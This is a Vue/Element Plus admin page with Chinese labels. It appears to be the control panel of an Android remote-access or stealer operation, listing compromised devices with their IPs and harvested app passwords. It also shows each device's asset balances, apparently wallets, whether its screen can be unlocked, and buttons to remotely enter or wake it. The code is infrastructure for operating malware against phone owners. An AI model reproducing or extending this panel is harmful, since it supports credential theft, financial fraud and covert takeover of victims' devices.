<template>
  <div class="mod-sys__log-operation">
    <el-form :inline="true" :model="dataForm" @keyup.enter="getDataList()">
      <el-form-item>
        <el-input v-model="dataForm.deviceId" placeholder="设备ID" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.model" placeholder="手机型号" clearable></el-input>
      </el-form-item>
      <!-- <el-form-item>
        <el-input v-model="dataForm.phone" placeholder="手机号"></el-input>
      </el-form-item> -->

      <el-form-item>
        <el-input v-model="dataForm.language" placeholder="语言" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.brand" placeholder="品牌" clearable></el-input>
      </el-form-item>

      <el-form-item>
        <el-select filterable v-model="dataForm.installApp" placeholder="已安装APP" clearable>
          <el-option v-for="app in installAppFilter" :key="app.packageName" :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
        </el-select>
      </el-form-item>

      <el-form-item>
        <el-select v-model="dataForm.status" placeholder="状态">
          <el-option label="熄屏" :value="0"></el-option>
          <el-option label="亮屏" :value="1"></el-option>
        </el-select>
      </el-form-item>

      <el-form-item>
        <el-button @click="getDataList()">{{ $t("query") }}</el-button>
      </el-form-item>
    </el-form>
    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle" style="width: 100%">
      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" show-overflow-tooltip width="100px"></el-table-column>
      <el-table-column prop="brand" label="品牌" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column prop="model" label="手机型号" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="language" label="语言" header-align="center" align="center" width="60px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="systemVersion" label="系统版本" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
      <el-table-column prop="sdkVersion" label="sdk版本" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
    
      <el-table-column label="屏幕分辨率" header-align="center" align="center" width="100px" :show-overflow-tooltip="true">
        <template v-slot="scope">
          {{ `${scope.row.screenWidth}×${scope.row.screenHeight}` }}
        </template>
      </el-table-column>
      <el-table-column prop="ip" label="IP" header-align="center" align="center" width="120px" :show-overflow-tooltip="true"></el-table-column>

      <el-table-column  label="App密码信息" header-align="center" align="left" width="200px" >
        <template v-slot="scope">
          <div v-for="(value, key) in scope.row.appPassword" :key="key">
              <el-tag type="success">{{ `${value.label}:${value.value}` }}</el-tag>
          </div>
        </template>

      </el-table-column>
      <el-table-column label="资产信息" header-align="center" align="left" width="250px">
        <template v-slot="scope">
          <div v-for="(value, key) in scope.row.assets" :key="key">
              <el-tag type="success">{{ `${value.app}(${value.name}):${value.amount} ${value.unit}` }}</el-tag>
          </div>
        </template>
      </el-table-column>

      <el-table-column label="设备状态" header-align="center" align="left" width="150px">
        <template v-slot="scope">
          <div> 
            可解锁
            <el-tag type="success" v-if="scope.row.lockScreen">YES</el-tag>
            <el-tag type="danger" v-else>NO</el-tag>
          </div>
          
           <div> 
            状态
            <el-tag type="danger" v-show="scope.row.status == 0">熄屏</el-tag>
            <el-tag type="success" v-show="scope.row.status == 1">亮屏</el-tag>
            <el-tag type="info" v-show="scope.row.status == 2">等待唤醒</el-tag>
            <el-tag type="info" v-show="scope.row.status == 3">等待唤醒</el-tag>
          </div>
        </template>
      </el-table-column>

      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center" width="150px"></el-table-column>
      <el-table-column :label="$t('handle')"   header-align="center" align="center" width="150px" fixed="right" >
        <template v-slot="scope">
          <div>
            <el-button type="primary" link @click="enterScreen(scope.row)">进入</el-button>
          </div>
          <div>
            <el-button type="primary" link @click="wakeup(scope.row)">唤醒</el-button>
          </div>
          <div>
            <el-button type="primary" link>备注</el-button>
          </div>
        </template>
      </el-table-column>
    </el-table>
    <el-pagination
      :current-page="page"
      :page-sizes="[10, 20, 50, 100]"
      :page-size="limit"
      :total="total"
      layout="total, sizes, prev, pager, next, jumper"
      @size-change="pageSizeChangeHandle"
      @current-change="pageCurrentChangeHandle"
    >
    </el-pagination>

    <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
  </div>
</template>

<script lang="ts">
import useView from "@/hooks/useView";
import baseService from "@/service/baseService";
import DeviceDetail from "@/views/device/detail.vue";
import { defineComponent, reactive, toRefs, ref } from "vue";
import { ElMessageBox, ElMessage } from "element-plus";
export default defineComponent({
  components: {
    DeviceDetail
  },
  setup() {
    const state = reactive({
      post: true,
      getDataListURL: "/device/page",
      getDataListIsPage: true,
      installAppFilter: [],
      dataForm: {
        deviceId: "",
        phone: "",
        model: "",
        language: "",
        brand: "",
        installApp: "",
        status: ''
      }
    });
    const deviceId = ref("");

    return { ...useView(state), ...toRefs(state), deviceId };
  },
  async mounted() {
    // let ws = new WebSocket("ws://127.0.0.1:8080/as/ws");
    // ws.onopen = () => {
    //   console.log("WebSocket连接成功");
    // };
    // ws.onmessage = (event) => {
    //   console.log("收到消息:", event.data);
    // };
    // ws.onclose = () => {
    //   console.log("WebSocket连接关闭");
    // };
    // ws.onerror = (error) => {
    //   console.log("WebSocket连接错误:", error);
    // };
    await this.fetchInstallAppFilterList();
  },
  methods: {
    enterScreen(row: any) {
      this.deviceId = row.deviceId;
      (this.$refs as any).deviceDetail.show(row);
    },
    async fetchInstallAppFilterList() {
      let { code, data, msg } = await baseService.post("/device/installAppFilterList");
      if (code == 0) {
        this.installAppFilter = data;
      } else {
        ElMessageBox.alert(msg, "错误", {
          type: "error",
          confirmButtonText: "OK"
        });
      }
    },
    async wakeup(row: any) {
      let {code , data, msg} = await baseService.post("/device/wakeup", {
        id:row.id
      });

      if (code == 0) {
        ElMessage({
              message: "操作成功,等待唤醒!",
              type: "success"
            });
            this.getDataList();
      } else {
        ElMessageBox.alert(msg, "错误", {
          type: "error",
          confirmButtonText: "OK"
        });
      }
    }
  }
});
</script>
